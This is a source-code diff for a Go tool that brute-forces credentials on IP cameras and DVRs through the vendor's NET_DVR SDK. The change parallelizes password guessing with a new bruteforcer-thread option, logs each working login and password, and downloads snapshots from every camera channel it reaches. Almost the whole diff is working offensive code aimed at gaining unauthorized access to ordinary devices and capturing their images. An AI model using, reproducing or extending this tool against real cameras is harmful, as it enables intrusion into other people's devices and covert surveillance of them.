@@ -21,6 +21,7 @@ import (
 )
 
 var threads        int
+var bf_threads     int
 var port           uint16
 var ping           bool
 var logins_file    string
@@ -87,14 +88,7 @@ func HPRPing(ip string) bool {
 	return ((response[3] == 0x10) && (response[7] == response[11]))
 }
 
-func grabShoots(ip string, uid int64, startChannel int, count int, login string, password string) {
-	if (count == 0) {
-		warn.Println("No cameras on", ip)
-
-		return
-	}
-
-
+func getSnapshots(ip string, uid int64, startChannel int, count int, login string, password string) {
 	downloaded := 0
 
 	for i := startChannel; i < startChannel + count; i++ {
@@ -127,6 +121,91 @@ func grabShoots(ip string, uid int64, startChannel int, count int, login string,
 	}
 }
 
+func processSnapshots(ip string, uid int64, login string, password string, device C.NET_DVR_DEVICEINFO) {
+	var ip_count C.BYTE = 0
+	var ipcfg C.NET_DVR_IPPARACFG
+	var written int32
+
+	// Getting count of IP cams
+	if (C.NET_DVR_GetDVRConfig(
+		(C.LONG)(uid),
+		C.NET_DVR_GET_IPPARACFG,
+		0,
+		(C.LPVOID)(unsafe.Pointer(&ipcfg)),
+		(C.DWORD)(unsafe.Sizeof(ipcfg)),
+		(*C.uint32_t)(unsafe.Pointer(&written)),
+	) >= 0) {
+		for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
+			ip_count++
+		}
+	}
+
+	// SHIT
+	if (ip_count != 0 || device.byChanNum != 0) {
+		if (device.byChanNum != 0) {
+			getSnapshots(
+				ip,
+				uid,
+				(int)(device.byStartChan),
+				(int)(device.byChanNum),
+				login,
+				password,
+			)
+		}
+
+		if (ip_count != 0) {
+			getSnapshots(
+				ip,
+				uid,
+				(int)(device.byStartChan) + 32,
+				(int)(ip_count),
+				login,
+				password,
+			)
+		}
+	} else {
+		warn.Println("No cameras on", ip)
+	}
+}
+
+type LoginData struct {
+	Login, Password string
+}
+
+func checkLogin(ip string, login string, password string, results chan DeviceInfo) bool {
+	var device C.NET_DVR_DEVICEINFO
+
+	uid := (int64)(C.NET_DVR_Login(
+		C.CString(ip),
+		C.WORD(port),
+		C.CString(login),
+		C.CString(password),
+		(*C.NET_DVR_DEVICEINFO)(unsafe.Pointer(&device)),
+	))
+
+	if (uid >= 0) {
+		succ.Printf("Logged in: %s:%s@%s\n", login, password, ip)
+
+		if (shoots_path != "") {
+			processSnapshots(ip, uid, login, password, device)
+		}
+
+		results <- DeviceInfo{
+			login,
+			password,
+			(uint8)(device.byStartChan),
+			(uint8)(device.byChanNum),
+			CameraAddress{ip, port},
+		}
+
+		C.NET_DVR_Logout((C.LONG)(uid))
+
+		return true
+	} else {
+		return false
+	}
+}
+
 func bruteforce(ip string, results chan DeviceInfo) {
 	if (ping) {
 		if (!HPRPing(ip)) {
@@ -136,79 +215,45 @@ func bruteforce(ip string, results chan DeviceInfo) {
 		}
 	}
 
+	found := false
 
-	for _, login := range logins {
-		for _, password := range passwords {
-			var device C.NET_DVR_DEVICEINFO
+	bfChan := make(chan LoginData)
+	bfg    := new(sync.WaitGroup)
 
-			uid := (int64)(C.NET_DVR_Login(
-				C.CString(ip),
-				C.WORD(port),
-				C.CString(login),
-				C.CString(password),
-				(*C.NET_DVR_DEVICEINFO)(unsafe.Pointer(&device)),
-			))
+	for i := 0; i < bf_threads; i++ {
+		bfg.Add(1)
 
-			if (uid >= 0) {
-				succ.Printf("Logged in: %s:%s@%s\n", login, password, ip)
+		go func() {
+			defer bfg.Done()
 
-				if (shoots_path != "") {
-					//
-					// Grabbing a photos
-					//
-
-					// I'm not really sure about all this logic.
-
-					var ipcfg C.NET_DVR_IPPARACFG
-					var written int32
-
-					if (C.NET_DVR_GetDVRConfig(
-						(C.LONG)(uid),
-						C.NET_DVR_GET_IPPARACFG,
-						0,
-						(C.LPVOID)(unsafe.Pointer(&ipcfg)),
-						(C.DWORD)(unsafe.Sizeof(ipcfg)),
-						(*C.uint32_t)(unsafe.Pointer(&written)),
-					) >= 0) {
-						var count C.BYTE = 0
-						for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
-							count++
-						}
-
-						if (count > 0) {
-							device.byChanNum    = count
-							device.byStartChan += 32
-						}
-					}
-
-					grabShoots(
-						ip,
-						uid,
-						(int)(device.byStartChan),
-						(int)(device.byChanNum),
-						login,
-						password,
-					)
+			for pair := range bfChan {
+				if checkLogin(ip, pair.Login, pair.Password, results) {
+					found = true
 				}
-
-				results <- DeviceInfo{
-					login,
-					password,
-					(uint8)(device.byStartChan),
-					(uint8)(device.byChanNum),
-					CameraAddress{ip, port},
-				}
-
-				C.NET_DVR_Logout((C.LONG)(uid))
-
-				return
 			}
-		}
+		}()
 	}
 
+Feeding:
+	for _, login := range logins {
+		for _, password := range passwords {
+			if (found) {
+				break Feeding
+			}
 
-	warn.Println("Can't log into", ip)
-	results <- DeviceInfo{Address: CameraAddress{ip, port}}
+			bfChan <- LoginData{login, password}
+		}
+	}
+	close(bfChan)
+
+	bfg.Wait()
+
+
+	if (!found) {
+		warn.Println("Can't log into", ip)
+
+		results <- DeviceInfo{Address: CameraAddress{ip, port}}
+	}
 }
 
 
@@ -267,6 +312,7 @@ func dumpGoodCSV(file *os.File, devices *[]CameraAddress) {
 
 func parseFlags() {
 	flag.IntVar(&threads, "threads", 1, "Threads count")
+	flag.IntVar(&bf_threads, "bf-threads", 1, "Bruteforcer threads count")
 	port = (uint16)(*flag.Int("port", 8000, "Camera service port"))
 	flag.BoolVar(&ping, "check", false, "Check cameras (experimental and not fully tested, but very useful)")
 	flag.StringVar(&logins_file, "logins", "logins", "A file with a list of logins to bruteforce")
